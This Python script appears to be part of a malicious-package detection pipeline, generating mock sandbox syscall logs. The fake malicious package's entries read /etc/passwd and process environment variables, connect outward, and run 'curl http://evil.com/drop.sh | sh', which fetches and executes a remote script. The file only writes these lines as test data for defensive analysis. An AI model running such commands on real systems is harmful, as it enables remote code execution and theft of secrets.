import json
import logging
from pathlib import Path
import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

DATA_DIR = Path(__file__).parent.parent / "data"
SYSCALLS_DIR = DATA_DIR / 'syscalls'
EXTRACT_DIR = DATA_DIR / 'extracted'
SYSCALLS_DIR.mkdir(parents=True, exist_ok=True)

def generate_mock_syscall_log(package_name):
    """
    Generates a mock syscall log representing dynamic sandbox execution.
    In a real system, tools like sysdig, strace, or eBPF would generate this.
    """
    logging.info(f"Running sandbox simulation for {package_name}...")
    
    logs = []
    
    if package_name == "requests-fake-1.0.0":
        # Simulate malicious behavior
        logs = [
            {"timestamp": str(datetime.datetime.now()), "syscall": "openat", "args": ["/etc/passwd", "O_RDONLY"], "result": 0, "process": "python"},
            {"timestamp": str(datetime.datetime.now()), "syscall": "openat", "args": ["/proc/self/environ", "O_RDONLY"], "result": 0, "process": "python"},
            {"timestamp": str(datetime.datetime.now()), "syscall": "socket", "args": ["AF_INET", "SOCK_STREAM", "IPPROTO_TCP"], "result": 3, "process": "python"},
            {"timestamp": str(datetime.datetime.now()), "syscall": "connect", "args": ["3", "192.168.10.55:80"], "result": 0, "process": "python"}, # sending POST data
            {"timestamp": str(datetime.datetime.now()), "syscall": "execve", "args": ["/bin/sh", "-c", "curl http://evil.com/drop.sh | sh"], "result": 0, "process": "python"},
        ]
    elif "urllib3" in package_name or "requests-2." in package_name:
        # Simulate benign behavior
        logs = [
            {"timestamp": str(datetime.datetime.now()), "syscall": "openat", "args": ["setup.py", "O_RDONLY"], "result": 0, "process": "python"},
            {"timestamp": str(datetime.datetime.now()), "syscall": "openat", "args": ["urllib3/__init__.py", "O_RDONLY"], "result": 0, "process": "python"}
        ]
        
    log_file = SYSCALLS_DIR / f"{package_name}_syscalls.log"
    with open(log_file, "w", encoding='utf-8') as f:
        for log in logs:
            f.write(json.dumps(log) + "\n")
            
    logging.info(f"Mock syscall logs generated at {log_file}")
    return log_file

def main():
    logging.info("Starting Phase 2: Dynamic execution (Sandbox)")
    if not EXTRACT_DIR.exists():
        logging.error("No extracted packages found. Run ingestion.py first.")
        return
        
    for pkg_dir in EXTRACT_DIR.iterdir():
        if pkg_dir.is_dir():
            generate_mock_syscall_log(pkg_dir.name)
            
    logging.info("Sandbox simulation complete.")

if __name__ == "__main__":
    main()
